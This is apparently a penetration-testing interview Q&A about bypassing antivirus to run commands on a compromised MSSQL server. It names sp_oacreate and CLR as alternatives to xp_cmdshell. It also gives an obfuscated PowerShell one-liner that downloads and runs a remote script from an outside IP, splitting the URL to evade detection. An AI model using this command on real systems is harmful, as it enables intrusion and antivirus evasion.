# 16. You have gained access to an MSSQL machine within an internal network, but the host runs antivirus. As soon as you enable `xp_cmdshell`, it is blocked, and you lack even command‑execution privileges. How can this be bypassed?

It is well known that MSSQL command execution has three basic methods: `xp_cmdshell`, `sp_oacreate`, and `CLR`. Since `xp_cmdshell` is blocked, choose one of the other two, particularly `CLR`.
**Command obfuscation example:**
`exec master.dbo.xp_cmdshell "powershell $a='IEX((new-object net.webclient).downloadstring(''ht';$b='tp://39.**.**.238:8888/360.ps1''))';IEX ($a+$b)"`



# 16. You have gained access to an MSSQL machine within an internal network, but the host runs antivirus. 
As soon as you enable `xp_cmdshell`, it is blocked, and you lack even command‑execution privileges. How can this be bypassed?

